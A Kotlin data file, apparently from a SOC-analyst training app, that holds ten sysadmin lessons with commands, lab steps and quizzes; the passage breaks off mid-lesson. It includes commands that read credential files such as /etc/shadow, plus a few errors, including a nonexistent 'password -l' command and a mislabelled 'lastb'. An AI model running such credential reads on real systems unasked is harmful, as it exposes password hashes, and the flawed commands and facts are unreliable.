package com.example.data

data class LessonModel(
    val id: Int,
    val title: String,
    val phase: Int, // 1 to 4
    val phaseName: String,
    val durationMin: Int,
    val theory: String,
    val commands: List<CommandModel>,
    val labSteps: List<String>,
    val labHints: List<String>,
    val quiz: List<QuizQuestionModel>,
    val resources: List<ResourceModel>
)

data class CommandModel(
    val category: String,
    val command: String,
    val description: String,
    val example: String = "",
    val os: String = "Linux" // Linux / Windows / Network / Security / PowerShell
)

data class QuizQuestionModel(
    val question: String,
    val options: List<String>,
    val answer: String
)

data class ResourceModel(
    val title: String,
    val url: String,
    val description: String,
    val platform: String, // TryHackMe, YouTube, Docs, Tools, HTB, LetsDefend
    val badgeColor: String = "orange", // red, orange, blue, green
    val isFree: Boolean = true
)

object LessonContent {
    val LESSONS: List<LessonModel> = listOf(
        // PHASE 1: SYSADMIN FOUNDATIONS
        LessonModel(
            id = 1,
            title = "Linux Fundamentals",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 30,
            theory = """
                Linux is the backbone of servers and SOC environments. Most enterprise network devices, cloud servers, and security tools run on Linux distributions, especially Ubuntu or Debian.
                
                The Linux filesystem is hierarchical, starting at the root directory represented by a forward slash (/).
                
                Key directories you must inspect during analysis:
                • /etc — Contains configuration files (e.g., etc/passwd for user lists).
                • /var/log — The jackpot directory containing system logs, authentication logs, and service logs.
                • /home — Contains user directories and user-specific configurations (like SSH keys).
                • /bin and /usr/bin — Extant executable programs and commands.
                • /proc — A virtual filesystem for running processes.
                • /tmp — Temporary files. Attackers love this directory because it often has wide-open write permissions!
                • /root — The home directory of the root user (super-administrator).
                
                File permissions in Linux use the rwx (Read, Write, Execute) system, typically represented by three octal digits for Owner, Group, and Others:
                • Read (r) = 4
                • Write (w) = 2
                • Execute (x) = 1
                
                Common permissions:
                • chmod 755 — (rwxr-xr-x) Owner can do anything, others can read and execute (ideal for scripts).
                • chmod 644 — (rw-r--r--) Owner can read/write, others can only read (standard text files).
                • chmod 600 — (rw-------) Only owner can read/write. Highly critical for securing SSH keys (id_rsa)!
                • chmod 777 — Extremely dangerous! Everyone has full rwx privileges, creating an immediate security risk.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Navigation", "pwd", "Prints current working directory", "pwd", "Linux"),
                CommandModel("Navigation", "ls -lta", "Lists all files with permissions, sizes, owners and sorted by time", "ls -lta /var/log", "Linux"),
                CommandModel("Navigation", "cd /var/log", "Changes directory to log repository", "cd /var/log", "Linux"),
                CommandModel("Navigation", "find / -name \"*.log\" 2>/dev/null", "Finds all files ending in .log suppressing errors", "find /var/log -name \"auth.log\"", "Linux"),
                CommandModel("File Viewing", "cat /etc/passwd", "View lists of local user configurations", "cat /etc/passwd", "Linux"),
                CommandModel("File Viewing", "tail -n 20 -f /var/log/syslog", "Observe system events and log additions live", "tail -f /var/log/syslog", "Linux"),
                CommandModel("File Viewing", "grep -i \"failed\" auth.log", "Case-insensitive search for failed SSH logins", "grep -i \"failed\" /var/log/auth.log", "Linux"),
                CommandModel("Processes", "ps aux", "Lists all active running processes", "ps aux | grep apache", "Linux"),
                CommandModel("Processes", "kill -9 1234", "Forces termination of a process by PID", "kill -9 1234", "Linux"),
                CommandModel("Processes", "systemctl status ssh", "Verifies if SSH server daemon is actively listening", "systemctl status sshd", "Linux")
            ),
            labSteps = listOf(
                "Rununame -a to inspect your active Linux kernel.",
                "Verify disk storage via df -h.",
                "Check free RAM via free -h.",
                "Observe current system runtime duration via uptime.",
                "Provision a sandbox user using sudo adduser testuser.",
                "Create a dedicated folder via mkdir /opt/securedata.",
                "Secure it via sudo chown testuser /opt/securedata && chmod 700 /opt/securedata.",
                "Confirm permissions by checking ls -la /opt/ securedata.",
                "Search for rogue administrative entries inside /etc/passwd.",
                "Extract any historical authentication errors with sudo grep Fail /var/log/auth.log."
            ),
            labHints = listOf(
                "Prints the kernel details.",
                "Lists disks in human readable format.",
                "Shows memory details.",
                "Tells how long the server has been online.",
                "Requires administrative privileges (sudo).",
                "Constructs directory.",
                "Limits folder exclusively to testuser.",
                "Verifies folder permissions match drwx------.",
                "Check users with a UID of 0.",
                "Checks auth history for SSH brute-forcing."
            ),
            quiz = listOf(
                QuizQuestionModel("What command shows your current directory?", listOf("ls", "pwd", "cd", "whoami"), "pwd"),
                QuizQuestionModel("What does chmod 600 mean?", listOf("Everyone can read", "Owner read and write only", "Full access for all", "No access for anyone"), "Owner read and write only"),
                QuizQuestionModel("Where are failed SSH logins logged on Ubuntu?", listOf("/var/log/syslog", "/var/log/kern.log", "/var/log/auth.log", "/etc/passwd"), "/var/log/auth.log"),
                QuizQuestionModel("What does tail -f do?", listOf("Delete last lines", "Count total lines", "Watch file live in real time", "Open file in editor"), "Watch file live in real time"),
                QuizQuestionModel("How do you force kill a process with PID 1234?", listOf("kill 1234", "stop 1234", "kill -9 1234", "end -f 1234"), "kill -9 1234")
            ),
            resources = listOf(
                ResourceModel("Linux Fundamentals Part 1", "https://tryhackme.com/room/linuxfundamentalspart1", "Free beginner room covering Linux basics", "TryHackMe", "red"),
                ResourceModel("Linux Fundamentals Part 2", "https://tryhackme.com/room/linuxfundamentalspart2", "Permissions, networking, and shell basics", "TryHackMe", "red"),
                ResourceModel("Linux in 100 Seconds", "https://www.youtube.com/watch?v=rrB13utjYV4", "Quick visual guide to how Linux works", "YouTube", "red"),
                ResourceModel("ExplainShell Parser", "https://explainshell.com", "Explains exactly what any shell command flag does", "Tools", "orange")
            )
        ),
        LessonModel(
            id = 2,
            title = "Windows Server Administration",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 35,
            theory = """
                Windows Server forms the central repository of identity, access, and enterprise configurations.
                
                The crown jewel of a Windows corporate network is Active Directory (AD). AD acts as a database and directory service that stores users, computers, printers, and groups, managing permissions and authentication.
                
                Core components:
                • DNS (Domain Name System) — Resolves human hostnames to computer IP addresses.
                • DHCP (Dynamic Host Configuration Protocol) — Automatically hands out IP addresses.
                • Group Policy Objects (GPO) — Allows administrators to centrally push security configs and restrictions (like disabling USB storage) to all domain machines.
                
                SOC Core Event IDs:
                Windows records activities under security event codes. You MUST memorize these:
                • 4624 — Successful user login.
                • 4625 — Failed user login (essential to capture credential stuffing/brute force attacks).
                • 4648 — A login was attempted using explicit credentials (pivoting/lateral movement).
                • 4720 — A new local or domain user account was created (potential backdooring).
                • 4732 — A user was added to a security-enabled local group e.g. Domain Admins (privilege escalation).
                • 1102 — Audit log was cleared! Attackers do this to destroy system investigation logs.
                • 7045 — A new service was registered in the registry (persistence/malware hook).
            """.trimIndent(),
            commands = listOf(
                CommandModel("AD Powershell", "Get-ADUser -Filter *", "Retrieves all Active Directory domain accounts", "Get-ADUser -Identity Administrator", "Windows"),
                CommandModel("AD Powershell", "Get-ADComputer -Filter *", "Lists all domain-joined Windows endpoints", "Get-ADComputer -Filter *", "Windows"),
                CommandModel("Events", "Get-WinEvent -LogName Security | Where-Object {\$_.Id -eq 4625}", "Extracts all failed local logons in PowerShell", "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625}", "Windows"),
                CommandModel("Local Admin", "net localgroup administrators", "Lists all accounts with administrative power on the machine", "net localgroup administrators", "Windows"),
                CommandModel("Networking", "ipconfig /all", "Displays complete network adapter and DNS information", "ipconfig /all", "Windows"),
                CommandModel("GPO", "gpupdate /force", "Forces immediate synchronization of group policies", "gpupdate /force", "Windows")
            ),
            labSteps = listOf(
                "Open PowerShell as an Administrator.",
                "Execute Get-LocalUser to catalog active machine accounts.",
                "Provision a new local test account using New-LocalUser -Name soctest.",
                "Launch the GUI Event Viewer via eventvwr.msc.",
                "Double-click on Windows Logs -> Security.",
                "Apply filters for failed login events (Event ID 4625).",
                "Apply filters for administrative changes (Event ID 4720).",
                "Run a targeted PowerShell search for the newest event logs.",
                "Inspect local administrative members via net localgroup administrators.",
                "Enforce security policy compliance with gpupdate /force."
            ),
            labHints = listOf(
                "Requires elevated admin command privileges.",
                "Displays user names, states, and descriptions.",
                "Adds user to safe sandbox directory.",
                "Launches the standard MMC viewer.",
                "Select Security to review audit activities.",
                "Filter current log by 4625.",
                "Check account creation triggers.",
                "Use Get-WinEvent commandlet.",
                "Critical diagnostic check for rogue systems.",
                "Synchronizes all domain-enforced rules."
            ),
            quiz = listOf(
                QuizQuestionModel("What Windows Event ID represents a failed login?", listOf("4624", "4625", "4720", "4732"), "4625"),
                QuizQuestionModel("What is the central controller of active directories?", listOf("GPO", "IIS", "Active Directory", "DNS"), "Active Directory"),
                QuizQuestionModel("What default port is used for Windows Remote Desktop Protocol (RDP)?", listOf("22", "23", "443", "3389"), "3389"),
                QuizQuestionModel("Which event ID tells us a security log was purged?", listOf("1102", "4624", "7045", "4732"), "1102"),
                QuizQuestionModel("What command refreshes Windows Group Policy?", listOf("gpupdate /force", "gpresult /r", "net localgroup", "net user"), "gpupdate /force")
            ),
            resources = listOf(
                ResourceModel("Windows Fundamentals 1", "https://tryhackme.com/room/windowsfundamentals1xbx", "Windows architecture, filesystem and configurations", "TryHackMe", "red"),
                ResourceModel("Active Directory Basics", "https://tryhackme.com/room/winadbasics", "Explore domains, domain controllers, and policies", "TryHackMe", "red"),
                ResourceModel("Ultimate Event ID Lookup", "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia", "The bible of Windows security log Event IDs", "Docs", "blue")
            )
        ),
        LessonModel(
            id = 3,
            title = "Networking Basics",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 40,
            theory = """
                All data in a modern system moves across networks. Understanding the OSI (Open Systems Interconnection) reference model is non-negotiable for SOC operators:
                
                The OSI 7-Layer Hierarchy:
                • Layer 7 (Application) — Web browsers and apps (HTTP, DNS, SSH, SMTP).
                • Layer 6 (Presentation) — Encryption and data conversion (SSL, TLS, ASCII).
                • Layer 5 (Session) — Handles sessions between systems (NetBIOS, Sockets).
                • Layer 4 (Transport) — Handles error delivery. Involves TCP (reliable) and UDP (fast but lossy) protocols. Port numbers exist here!
                • Layer 3 (Network) — Handshakes routing and IP addressing. IP routers operate here!
                • Layer 2 (Data Link) — Media Access Control (MAC) hardware addresses, switches, and VLANs.
                • Layer 1 (Physical) — Copper wires, fiber optic cables, wireless signals, and hardware adaptors.
                
                Core Well-Known Ports:
                - SSH = 22 | FTP = 21 | Telnet = 23 | SMTP = 25
                - DNS = 53 | HTTP = 80 | HTTPS = 443 | SMB = 445
                - RDP = 3389 | MySQL = 3306
                
                Subnets:
                A subnet divides network IP arrays into isolated groupings:
                • /24 (Netmask 255.255.255.0) supports up to 254 active host IPs.
                • Private IP configurations: 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Network", "ip a", "Displays interfaces, links, and assigned IPs", "ip a", "Linux"),
                CommandModel("Packet Capture", "sudo tcpdump -i eth0 -n -c 5", "Captures five packets on interface eth0", "tcpdump -i eth0 -n port 80", "Linux"),
                CommandModel("DNS", "dig google.com A", "Performs DNS A-record query on domain name", "dig -x 8.8.8.8", "Linux"),
                CommandModel("Ports State", "ss -tulnp", "Lists all active local TCP/UDP listening ports", "ss -tulnp", "Linux"),
                CommandModel("Diagnostic", "ping -c 4 8.8.8.8", "Tests baseline system connectivity to target", "ping google.com", "Linux")
            ),
            labSteps = listOf(
                "Find local adapter settings via ip a.",
                "Trace standard routing tables with ip r.",
                "Execute ping to query google.com.",
                "Perform traceroute to find intermediate router nodes.",
                "List all local listening ports with ss -tulnp.",
                "Use dig to dump domain name A-records.",
                "Scan local IP endpoints with nmap -sV -p 1-1000 localhost.",
                "Perform packet interception with tcpdump -v.",
                "Save packet results to disk with tcpdump -w captures.pcap.",
                "Check system network state with netstat -ano."
            ),
            labHints = listOf(
                "Check for loopback and active IP address fields.",
                "Look for the gateway address line.",
                "Verifies active packets hit the target.",
                "Visualizes intermediate network nodes.",
                "Spot anomalous ports listening locally.",
                "Shows domain to IP registration charts.",
                "Checks running services.",
                "Use Administrative power (sudo) to intercept adapters.",
                "Dumps raw capture data to PCAP format.",
                "Checks active network mappings."
            ),
            quiz = listOf(
                QuizQuestionModel("What OSI layer operates IP addresses?", listOf("Layer 2", "Layer 3", "Layer 4", "Layer 7"), "Layer 3"),
                QuizQuestionModel("Which port does HTTPS use?", listOf("80", "21", "443", "8080"), "443"),
                QuizQuestionModel("How many hosts can a /24 subnet hold?", listOf("126", "254", "512", "1024"), "254"),
                QuizQuestionModel("What CLI tool captures raw packets?", listOf("nmap", "netstat", "tcpdump", "ping"), "tcpdump"),
                QuizQuestionModel("What is the Windows equivalent of traceroute?", listOf("traceroute", "pathping", "tracert", "route"), "tracert")
            ),
            resources = listOf(
                ResourceModel("Intro to Networking", "https://tryhackme.com/room/introtonetworking", "OSI model, routing, and packet structures", "TryHackMe", "red"),
                ResourceModel("Wireshark Basics", "https://tryhackme.com/room/wiresharkthebasics", "Learn to unpack TCP streams, filters and packets", "TryHackMe", "red"),
                ResourceModel("Professor Messer Network Course", "https://www.youtube.com/@professormesser", "Comprehensive free training course on networking concepts", "YouTube", "red")
            )
        ),
        LessonModel(
            id = 4,
            title = "Virtualization & Cloud Basics",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 35,
            theory = """
                Virtualization enables running multiple separate operating systems (VMs) on a single physical host machine, isolated from one another.
                
                A Hypervisor is the virtualization controller layer:
                • Type 1 Hypervisor (Bare Metal) — Runs directly on top of physical hardware (e.g., VMware ESXi, Proxmox VE, Hyper-V).
                • Type 2 Hypervisor (Hosted) — Runs as an application inside a host OS (e.g., Oracle VirtualBox, VMware Workstation).
                
                Cloud Environments:
                Cloud computing maps physical centers to online portals, split into:
                • IaaS (Infrastructure as a Service) — You rent servers/storage (e.g., AWS EC2, Azure VMs). You manage OS and app layers.
                • PaaS (Platform as a Service) — You manage code execution while cloud providers manage the OS (e.g., Heroku, AWS Elastic Beanstalk).
                • SaaS (Software as a Service) — Standard web programs (Google Workspace, Microsoft 365, Slack).
                
                Key Cloud Components:
                • IAM (Identity & Access Management) — Governs users, roles and asset policies.
                • Security Groups — Hyper-converged cloud instance virtual firewalls.
                • VPC (Virtual Private Cloud) — Isolated secure network bubbles inside public cloud providers.
            """.trimIndent(),
            commands = listOf(
                CommandModel("VPC Security", "aws ec2 describe-security-groups", "Describes cloud firewall and security groups in AWS CLI", "aws ec2 describe-security-groups", "Security"),
                CommandModel("VM Command", "vboxmanage list vms", "Lists localized Oracle VirtualBox VM states", "vboxmanage list vms", "Linux"),
                CommandModel("SSH Remote", "ssh -i mykey.pem ubuntu@1.2.3.4", "Connects to a remote cloud machine using an RSA key", "ssh -i key.pem ubuntu@54.210.12.3", "Linux")
            ),
            labSteps = listOf(
                "Install VM software e.g., Oracle VirtualBox.",
                "Download a standard Ubuntu Server ISO image.",
                "Provision a VM with 2GB RAM and 20GB HDD space.",
                "Mount the ISO and perform local OS installation.",
                "Enable host-to-guest networking inside your VM preferences.",
                "Open CLI and verify connectivity using SSH.",
                "Create a personal AWS Free Tier Account.",
                "Provision a micro instance (t2.micro) under EC2.",
                "Create a custom security group that only permits port 22 (SSH).",
                "Successfully establish remote connection to your cloud system."
            ),
            labHints = listOf(
                "Obtain VirtualBox online safely.",
                "Select a stable LTS release.",
                "Sufficient for server operation limits.",
                "Follow standard prompts, set password.",
                "Enables direct terminal communication.",
                "Authenticates against Guest OS IPs.",
                "Requires billing validation card.",
                "AWS provides 750 free hours monthly.",
                "Crucial to block port scanning attackers.",
                "Use the downloaded .pem key file."
            ),
            quiz = listOf(
                QuizQuestionModel("Where does a Type 1 hypervisor execute?", listOf("Directly on hardware", "Inside an operating system", "Only inside a browser", "In cloud zones"), "Directly on hardware"),
                QuizQuestionModel("Which is a Type 2 hypervisor?", listOf("VMware ESXi", "Hyper-V", "VirtualBox", "KVM"), "VirtualBox"),
                QuizQuestionModel("What does IaaS stand for?", listOf("Internet as a Service", "Infrastructure as a Service", "Interface as a Service", "Integration as a Service"), "Infrastructure as a Service"),
                QuizQuestionModel("What is an AWS Security Group?", listOf("IAM role", "Virtual firewall for instances", "Encryption algorithm", "Database folder"), "Virtual firewall for instances"),
                QuizQuestionModel("What does VPC stand for?", listOf("Virtual Private Cloud", "Verified Public Computer", "Virtual Private Connection", "Virtual Protocol Channel"), "Virtual Private Cloud")
            ),
            resources = listOf(
                ResourceModel("Cloud Security Intro", "https://tryhackme.com/room/cloudsecurityintro", "Core models of cloud delivery", "TryHackMe", "red"),
                ResourceModel("AWS Lab Setup", "https://tryhackme.com/room/awsintroduction", "Learn how to deploy and secure AWS elements first hand", "TryHackMe", "red"),
                ResourceModel("Nana Cloud Containers", "https://www.youtube.com/watch?v=3c-iBn73dDE", "VMs vs Docker containers demystified", "YouTube", "red")
            )
        ),
        LessonModel(
            id = 5,
            title = "User & Group Management",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 25,
            theory = """
                A primary job of systemic hardening is managing users.
                
                Rogue local users are a primary payload of persistent attackers. We need to audit user files and manage administrative memberships.
                
                Key elements:
                • Users file: /etc/passwd (readable by all).
                • Password hashes file: /etc/shadow (readable only by root). Keep these protected!
                • Domain groups: Domain Admins, Account Operators. Local: Administrators, sudo group.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Users", "sudo adduser analyst", "Creates a new local user", "adduser analyst", "Linux"),
                CommandModel("Groups", "sudo usermod -aG sudo analyst", "Adds user to the administrative sudo group", "usermod -aG sudo user", "Linux"),
                CommandModel("Hashes", "sudo cat /etc/shadow", "Displays salted password hashes", "cat /etc/shadow", "Linux")
            ),
            labSteps = listOf(
                "View the user index via cat /etc/passwd.",
                "Check for users with UID 0 (root level).",
                "Create a new group: sudo groupadd security.",
                "Add user: sudo adduser compliance.",
                "Map compliance to administrative groups.",
                "Verify groups file contents: cat /etc/group.",
                "Lock account access: password -l compliance.",
                "Unlock account: password -u compliance.",
                "Delete a test user account: userdel compliance.",
                "Recheck authentication success logs."
            ),
            labHints = listOf(
                "Parses local usernames and structural IDs.",
                "Only root should hold UID 0 designation.",
                "Establishes a group identifier.",
                "Adds account records.",
                "Enables controlled privilege sharing.",
                "Confirm group addition details.",
                "Disables shell login options.",
                "Restores standard active status.",
                "Deletes user from /etc/passwd registry.",
                "Verify no rogue backdoors exist."
            ),
            quiz = listOf(
                QuizQuestionModel("Which file holds local Linux users?", listOf("/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group"), "/etc/passwd"),
                QuizQuestionModel("What is the unique User Identifier for root?", listOf("1000", "500", "0", "1"), "0"),
                QuizQuestionModel("Where are shadow hashed passwords protected?", listOf("/etc/passwd", "/etc/shadow", "/etc/keys", "/etc/group"), "/etc/shadow"),
                QuizQuestionModel("What command lists group assignments on Linux?", listOf("groups", "pwd", "ls", "whoami"), "groups"),
                QuizQuestionModel("Which command adds users on Linux?", listOf("adduser", "mkuser", "newuser", "create"), "adduser")
            ),
            resources = listOf(
                ResourceModel("Linux Privilege Escalation", "https://tryhackme.com/room/linuxprivesc", "Learn how attackers abuse user permissions to get root", "TryHackMe", "red"),
                ResourceModel("Simple Security User hardening", "https://explainshell.com", "Guide to user management in secure architectures", "Docs", "blue")
            )
        ),
        // LESSON 6
        LessonModel(
            id = 6,
            title = "File Systems Storage & Backup",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 25,
            theory = """
                Hard drives represent persistence. Understanding how to query disks, partitions, and back up evidence is critical.
                
                Windows uses NTFS/FAT. Linux uses EXT4/XFS.
                
                Backup architectures:
                • Standard archive: tar (tape archiver).
                • Sync tool: rsync. Backups must be offsite, immutable, and encrypted to prevent ransomware modifications.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Disk free", "df -h", "Displays system disk space availability", "df -h", "Linux"),
                CommandModel("Zip", "tar -czvf backup.tar.gz /var/log", "Creates a compressed tar zip archive", "tar -cvf backup.tar /dir", "Linux"),
                CommandModel("Sync", "rsync -avz /src /dest", "Syncs files and directories securely", "rsync -a /var/log /backups", "Linux")
            ),
            labSteps = listOf(
                "Check system mount configurations with df -h.",
                "Inspect device blocks via lsblk.",
                "Generate an empty directory: mkdir /mnt/backup.",
                "Run a trial backup archive of /var/log folder.",
                "Sync directories using rsync utility.",
                "Compress a folder into a standard tarball.",
                "Calculate cryptographic hash: sha256sum backup.tar.gz.",
                "Create a temporary cron script for automation.",
                "Decompress files into /tmp sandbox room.",
                "Verify backup integrity hashes match original file hashes."
            ),
            labHints = listOf(
                "Displays mounted volumes.",
                "Lists all attached disks.",
                "Sets up path directories.",
                "Zips log folders.",
                "Saves differential files.",
                "Combines files into a target bundle.",
                "Generates integrity baseline.",
                "Allows scheduled backups.",
                "Validates successful file recovery.",
                "Proves file contents remained uncorrupted."
            ),
            quiz = listOf(
                QuizQuestionModel("Which command checks disk space?", listOf("ls", "pwd", "df -h", "du"), "df -h"),
                QuizQuestionModel("What is 'tar' commonly used for?", listOf("Network capture", "Database hosting", "File archiving", "Password hacking"), "File archiving"),
                QuizQuestionModel("Which protocol does rsync use for secure transfer?", listOf("FTP", "SSH", "Telnet", "HTTP"), "SSH"),
                QuizQuestionModel("What tool calculates integrity hashes?", listOf("sha256sum", "grep", "cat", "tail"), "sha256sum"),
                QuizQuestionModel("How do you list block storage devices?", listOf("lsblk", "df", "free", "uname"), "lsblk")
            ),
            resources = listOf(
                ResourceModel("Storage management", "https://tryhackme.com/room/linuxfundamentalspart2", "Filesystem storage deep dive", "TryHackMe", "red")
            )
        ),
        // LESSON 7
        LessonModel(
            id = 7,
            title = "Shell Scripting Bash & PowerShell",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 40,
            theory = """
                Automation is key to triage. SOC analysts write scripts to gather triage data fast rather than checking items manually on 100 endpoints.
                
                Bash utilizes simple syntax, starting with the shebang (#!/bin/bash).
                Powershell relies on object-oriented cmdlets following Verb-Noun syntax.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Script running", "chmod +x script.sh && ./script.sh", "Enables execute permission and runs bash script", "./script.sh", "Linux"),
                CommandModel("Triage Script", "Get-Process | Where-Object {\$_.CPU -gt 10}", "PowerShell script tracking CPU-hungry processes", "Get-Process", "PowerShell"),
                CommandModel("Bash loop", "for i in {1..10}; do ping -c 1 10.0.0.\$i; done", "Simple loop to test local IP availability", "for i in ...; do ping; done", "Linux")
            ),
            labSteps = listOf(
                "Create file: touch triage.sh.",
                "Insert shebang #!/bin/bash on first line.",
                "Add commands to collect system metadata, RAM, and logs.",
                "Grant execution permission: chmod +x triage.sh.",
                "Run trial file and analyze console feedback.",
                "Construct a basic looping test check script.",
                "Open PowerShell compiler editor.",
                "Build a pipeline targeting failed log files.",
                "Export PowerShell variables to local txt summaries.",
                "Automate script firing mechanisms."
            ),
            labHints = listOf(
                "Creates script file.",
                "Points interpreter to Bash engine.",
                "Gathers status reports.",
                "Enables execute bits.",
                "Verify stdout output returns normally.",
                "Runs multiple automated tasks.",
                "Ready to accept cmdlets.",
                "Addresses 4625 IDs.",
                "Stores results in local storage.",
                "Fires task schedules."
            ),
            quiz = listOf(
                QuizQuestionModel("What is #!/bin/bash called?", listOf("Comment", "Shebang", "Tag", "Hash"), "Shebang"),
                QuizQuestionModel("How do you render a Bash script executable?", listOf("chmod +x", "chown", "ls -l", "chmod 600"), "chmod +x"),
                QuizQuestionModel("What is the PowerShell Verb-Noun command for listings?", listOf("Get-Process", "list-processes", "show-proc", "proc"), "Get-Process"),
                QuizQuestionModel("Which loop executes a block multiple times?", listOf("for", "if", "select", "grep"), "for"),
                QuizQuestionModel("How are variables declared in Bash scripts?", listOf("With suffix %", "With prefix $", "Using VAR keyword", "No prefix needed"), "With prefix $")
            ),
            resources = listOf(
                ResourceModel("Bash Scripting Room", "https://tryhackme.com/room/bashscripting", "Learn standard automating scripts", "TryHackMe", "red")
            )
        ),
        // LESSON 8
        LessonModel(
            id = 8,
            title = "Services & Daemons",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 25,
            theory = """
                Services (daemons in Linux) are background programs that start at boot-up.
                
                Attackers often hijack services for persistence. We monitor running services and active system ports.
                
                Management tools: systemctl on Linux, Get-Service on Windows.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Systemctl status", "systemctl status sshd", "Checks if SSH service is actively running", "systemctl status apache2", "Linux"),
                CommandModel("List services", "systemctl list-units --type=service", "Lists all loaded system active services", "systemctl list-units", "Linux"),
                CommandModel("Windows Service", "Get-Service | Where-Object {\$_.Status -eq 'Running'}", "Lists running Windows services", "Get-Service", "PowerShell")
            ),
            labSteps = listOf(
                "Verify daemon status for web service.",
                "Stop service: systemctl stop apache2.",
                "Start service: systemctl start apache2.",
                "Disable service boot firing: systemctl disable apache2.",
                "Enable service boot firing: systemctl enable apache2.",
                "List all active services in systemctl.",
                "Check failing daemons with journalctl.",
                "Inspect running Windows processes.",
                "Analyze Windows service configuration blocks.",
                "Verify listening ports matches active processes."
            ),
            labHints = listOf(
                "Verifies active hosting.",
                "Terminates server instantly.",
                "Restores hosting operation.",
                "Prevents system start loading.",
                "Configures auto boot-up on start.",
                "Queries active system units.",
                "Displays boot logging alerts.",
                "Use PowerShell query.",
                "Examine services and startup configurations.",
                "Match ports list to PID."
            ),
            quiz = listOf(
                QuizQuestionModel("What is a background program called in Linux?", listOf("Process", "Daemon", "Script", "Systemd"), "Daemon"),
                QuizQuestionModel("How do you stop a service in Linux?", listOf("systemctl stop", "kill service", "stop -f", "systemctl disable"), "systemctl stop"),
                QuizQuestionModel("What does 'systemctl enable' do?", listOf("Starts service", "Enables service to launch at boot", "Installs service", "Configures security parameters"), "Enables service to launch at boot"),
                QuizQuestionModel("Which tool views Windows background services?", listOf("Get-Service", "service-list", "tasklist", "systemctl"), "Get-Service"),
                QuizQuestionModel("What command logs boot daemon error events?", listOf("journalctl -xe", "grep", "syslog", "cat"), "journalctl -xe")
            ),
            resources = listOf(
                ResourceModel("Systemd and services tutorial", "https://linuxjourney.com", "Excellent resources on process architectures", "Docs", "blue")
            )
        ),
        // LESSON 9
        LessonModel(
            id = 9,
            title = "Patch Management & Hardening",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 30,
            theory = """
                Unpatched software is the primary entry point for cyber threats.
                
                Hardening involves minimizing the attack surface by disabling unused ports, removing unnecessary programs, and updating software regularly.
                
                Key tools: apt update && apt upgrade on Ubuntu, WSUS on Windows Server environments.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Upgrade pkgs", "sudo apt update && sudo apt upgrade -y", "Secures system by updating all dependencies", "apt upgrade", "Linux"),
                CommandModel("Unused service", "sudo apt purge telnetd -y", "Purges insecure, cleartext legacy daemon ports", "apt purge ...", "Linux"),
                CommandModel("UFW firewall", "sudo ufw enable && sudo ufw allow 22", "Enables firewall and permits only SSH access", "ufw status", "Linux")
            ),
            labSteps = listOf(
                "Check for pending package updates.",
                "Run a full package security upgrade.",
                "Identify unused, listening service protocols.",
                "Remove unsecured services (like Telnet) from the server.",
                "Status check on local host firewalls.",
                "Enable host firewall with strict standard denies.",
                "Allow secure remote channels like SSH.",
                "Check password configuration limits in /etc/login.defs.",
                "Disable root logins via SSH in sshd_config.",
                "Reload and test hardened service profiles."
            ),
            labHints = listOf(
                "Use apt update command.",
                "Applies verified software fixes.",
                "Inspect listening ports.",
                "Purge telnet packages.",
                "Check UFW or firewall-cmd status.",
                "Restricts random access.",
                "Ensures you maintain remote access.",
                "Audit password complexity settings.",
                "Lock PermitRootLogin configuration.",
                "Restart service to activate config."
            ),
            quiz = listOf(
                QuizQuestionModel("What command upgrades packages in Ubuntu?", listOf("apt upgrade", "update pkgs", "sys-install", "yum-upgrade"), "apt upgrade"),
                QuizQuestionModel("Why is Telnet considered an insecure service?", listOf("Takes too much RAM", "Sends credentials in cleartext", "Easily crashes", "Only runs on Windows"), "Sends credentials in cleartext"),
                QuizQuestionModel("What is the standard dynamic firewall tool in Ubuntu?", listOf("UFW", "IPtables", "Firewalld", "Defender"), "UFW"),
                QuizQuestionModel("How do you disable remote root logins?", listOf("Modify /etc/passwd", "Edit /etc/ssh/sshd_config", "Enable firewall", "Delete root user"), "Edit /etc/ssh/sshd_config"),
                QuizQuestionModel("What policy ensures weak accounts are hardened?", listOf("GPO Complexity rules", "MFA updates", "WAF rules", "DNS routing"), "GPO Complexity rules")
            ),
            resources = listOf(
                ResourceModel("Linux Hardening Room", "https://tryhackme.com/room/linuxhardening", "Advanced terminal system hardening", "TryHackMe", "red")
            )
        ),
        // LESSON 10
        LessonModel(
            id = 10,
            title = "Monitoring & Logging",
            phase = 1,
            phaseName = "Sysadmin Foundations",
            durationMin = 35,
            theory = """
                If it isn't logged, it didn't happen.
                
                Logs are the breadcrumbs SOC analysts follow during an investigation.
                
                Directories to watch:
                • Linux: /var/log/auth.log (auth transactions), syslog (system debug), nginx/error.log.
                • Windows Event Viewer: Application logs, Security logs, System logs.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Grep errors", "grep -v \"正常\" /var/log/syslog | grep \"error\"", "Ignores clean status and pulls warning flags", "grep -i 'error' syslog", "Linux"),
                CommandModel("Logrotate manual", "logrotate --force /etc/logrotate.conf", "Manually trigger log rotation to inspect setup", "logrotate -f", "Linux"),
                CommandModel("Tail auth", "tail -f /var/log/auth.log", "Monitor active authorization handshakes live", "tail -f auth.log", "Linux")
            ),
            labSteps = listOf(
                "Navigate to /var/log to see directory mapping.",
                "Inspect syslog file tail lines.",
                "Audit user logins via the last command.",
                "List logged-out session histories with lastb.",
                "Tail auth.log file in real-time.",
                "Generate a mock threat trigger (failed sudo request).",
                "Observe how auth.log generates the threat record.",
                "Review log rotation controls inside logrotate.conf.",
                "List events recorded inside dmesg boot stream.",
                "Observe security event logs inside Windows platforms."
            ),
            labHints = listOf(
